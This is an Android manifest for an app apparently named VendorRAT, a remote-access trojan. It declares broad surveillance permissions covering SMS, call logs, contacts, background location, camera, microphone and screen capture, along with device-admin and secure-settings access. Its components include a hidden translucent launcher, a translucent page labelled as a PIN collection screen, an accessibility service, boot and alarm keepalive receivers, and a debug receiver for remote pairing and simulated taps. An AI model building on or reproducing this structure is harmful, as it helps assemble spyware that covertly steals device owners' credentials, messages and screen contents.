<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- ====== 网络权限 ====== -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />

    <!-- ====== 存储权限 ====== -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
        android:maxSdkVersion="29" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
        tools:ignore="ScopedStorage" />

    <!-- ====== 短信权限 ====== -->
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />

    <!-- ====== 通话权限 ====== -->
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />

    <!-- ====== 联系人权限 ====== -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.WRITE_CONTACTS" />

    <!-- ====== 位置权限 ====== -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />

    <!-- ====== 摄像头/录音 ====== -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />

    <!-- ====== 通知权限 (Android 13+) ====== -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <!-- ====== 保活权限 ====== -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"
        tools:targetApi="34" />
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <!-- ====== 悬浮窗 ====== -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

    <!-- ====== 安装权限 ====== -->
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />

    <!-- ====== 设备管理 ====== -->
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />

    <!-- ====== 系统设置 (亮度控制) ====== -->
    <uses-permission android:name="android.permission.WRITE_SETTINGS"
        tools:ignore="ProtectedPermissions" />

    <!-- ====== 华为厂商权限 ====== -->
    <uses-permission android:name="com.huawei.permission.external_app_settings.USE_COMPONENT" />

    <!-- ====== 无障碍自动恢复 (通过 ADB 授予) ====== -->
    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"
        tools:ignore="ProtectedPermissions" />

    <!-- ====== 账号管理 ====== -->
    <uses-permission android:name="android.permission.GET_ACCOUNTS" />

    <application
        android:name=".MyApp"
        android:allowBackup="false"
        android:icon="@drawable/ic_launcher_background"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:usesCleartextTraffic="true"
        android:networkSecurityConfig="@xml/network_security_config"
        android:theme="@style/Theme.VendorRAT"
        tools:targetApi="34">

        <!-- ====== Activities ====== -->

        <!-- 启动 Activity（透明/无界面） -->
        <activity
            android:name=".activity.ActivMain"
            android:exported="true"
            android:configChanges="orientation|screenSize|keyboardHidden"
            android:theme="@android:style/Theme.Translucent.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- 权限请求 Activity -->
        <activity
            android:name=".activity.PermissionActivity"
            android:exported="true"
            android:theme="@android:style/Theme.Translucent.NoTitleBar" />

 <!-- PIN 采集页 -->
  <activity
     android:name=".activity.LockCredentialPromptActivity"
      android:exported="false"
     android:theme="@android:style/Theme.Translucent.NoTitleBar" />

        <!-- 系统凭证验证 Activity -->
 <activity
android:name=".activity.ConfirmDeviceActivity"
            android:exported="false"
     android:theme="@android:style/Theme.Translucent.NoTitleBar" />

        <!-- ====== Services ====== -->

        <!-- 无障碍服务 (模块 02) -->
        <service
            android:name=".service.MyAccessibilityService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- 媒体前台服务 (模块 06) -->
        <service
            android:name=".control.service.MediaLiveService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="mediaProjection" />

        <!-- 保活 JobService (模块 07) — 对齐 vendor: extends JobService, 无前台通知 -->
        <service
            android:name=".keepalive.service.WIFIBackgroundService"
            android:permission="android.permission.BIND_JOB_SERVICE"
            android:enabled="true"
            android:exported="false" />

        <!-- 账号认证服务 (模块 07) -->
        <service
            android:name=".keepalive.service.AccountAuthenticatorService"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accounts.AccountAuthenticator" />
            </intent-filter>
            <meta-data
                android:name="android.accounts.AccountAuthenticator"
                android:resource="@xml/authenticator" />
        </service>

        <!-- JobScheduler 保活 (模块 07) -->
        <service
            android:name=".keepalive.KeepAliveJobService"
            android:permission="android.permission.BIND_JOB_SERVICE"
            android:exported="true" />

        <!-- ====== Receivers ====== -->

        <!-- 开机自启 (模块 07) -->
        <receiver
            android:name=".keepalive.receiver.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

        <!-- 定时唤醒 (模块 07) -->
        <receiver
            android:name=".keepalive.receiver.AlarmReceiver"
            android:enabled="true"
            android:exported="false" />

        <!-- 设备管理员 (模块 02) -->
        <receiver
            android:name=".service.AppDeviceAdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <!-- Debug receiver: trigger pairing/reset/status via ADB broadcast -->
        <receiver
            android:name=".debug.DebugReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="com.vendor.rat.DEBUG_START_PAIR" />
                <action android:name="com.vendor.rat.DEBUG_RESET_PAIR" />
                <action android:name="com.vendor.rat.DEBUG_STATUS" />
                <action android:name="com.vendor.rat.DEBUG_OPEN_DEV_OPTIONS" />
                <action android:name="com.vendor.rat.DEBUG_TAP" />
            </intent-filter>
        </receiver>

    </application>

</manifest>
